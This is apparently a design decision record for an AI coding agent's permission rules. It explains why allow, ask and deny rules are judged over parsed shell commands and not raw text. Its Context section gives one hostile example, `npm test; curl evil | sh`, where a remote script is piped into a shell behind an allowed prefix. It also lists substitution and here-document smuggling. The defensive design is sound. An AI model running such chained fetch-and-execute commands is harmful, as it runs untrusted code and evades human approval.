# 0040. Permission rules are judged over parsed commands

- Status: Accepted
- Date: 2026-10-21

## Context

Auto review ([0004](0004-command-approval-from-one-grammar.md)) allows a line only when every
command in it is provably read-only, and asks otherwise. Users need more: lists of what to
allow, ask about and deny, in the syntax Claude Code users already know, so that `npm test`
does not ask every time and `.env` is never read. Matching a rule against the raw command
line is the usual way such lists fail. `npm test; curl evil | sh`, `$(...)`, wrappers,
here-documents and redirects all hide a second command from a prefix match.

## Decision

- Rules are `Tool` or `Tool(specifier)` in Claude Code's syntax: `Bash(npm run test:*)`,
  `Read(./.env)`, `Edit(src/**)`, `WebFetch(domain:docs.github.com)`, `mcp__server__tool`.
  `parseRule` refuses what it cannot read, and the settings screen shows why.
- Deny beats ask beats allow, whichever file a rule came from. What a folder's files grant
  needs approval ([0041](0041-folder-settings-grant-only-when-approved.md)). What they
  restrict always applies.
- A Bash rule is judged on the line's parsed commands (the grammar of 0004, for bash and for
  PowerShell), never on its text:
  - a deny or ask rule that matches any command decides the line, and a line the grammar
    cannot read is scanned as text for deny and ask rules;
  - an allow needs a rule for every command, and a line the grammar cannot read is never
    allowed by a rule;
  - words known only when the line runs (variables, substitutions, globs) can satisfy a
    prefix or a `*`, never a literal word;
  - a redirect that writes is never allowed by a Bash rule, since the write is not the
    rule's to grant;
  - a command fed from a redirect or here-document (`bash < script`) does not match an exact
    rule for the bare command.
- Path rules use gitignore syntax with explicit anchors (`//abs`, `~/`, and `/` for the
  workspace root). `.` and `..` are resolved before matching. Deny and ask rules match a
  name in any folder, and allow rules stay inside the workspace.
- "Always allow" proposes the narrowest sound rule (`suggestRule`): a prefix rule only for
  everyday commands with a known subcommand set, the exact command for shells,
  interpreters, `sudo`, `npx`, `curl`, `rm` and the like, and nothing for lines no rule can
  describe. `saveRule` writes it to the user, project or local file and leaves the rest of
  the file alone.

## Consequences

- Rules sit in front of the read-only classifier. `createShellAssessor` asks the rules first
  and falls back to the classification of 0004.
- A rule changes how often the agent asks. It cannot widen what a mode forbids: Plan and Ask
  stay read-only, and protected paths keep asking (0004).
- Rules judge the text and structure of a line, not the file system. A link in the workspace
  that points at a denied file is not recognised in a shell word. The file tools resolve real
  paths before they consult the rules. Threat model RP3.
- Tests check that every suggestion parses, allows the line it came from and allows nothing
  the line did not say.
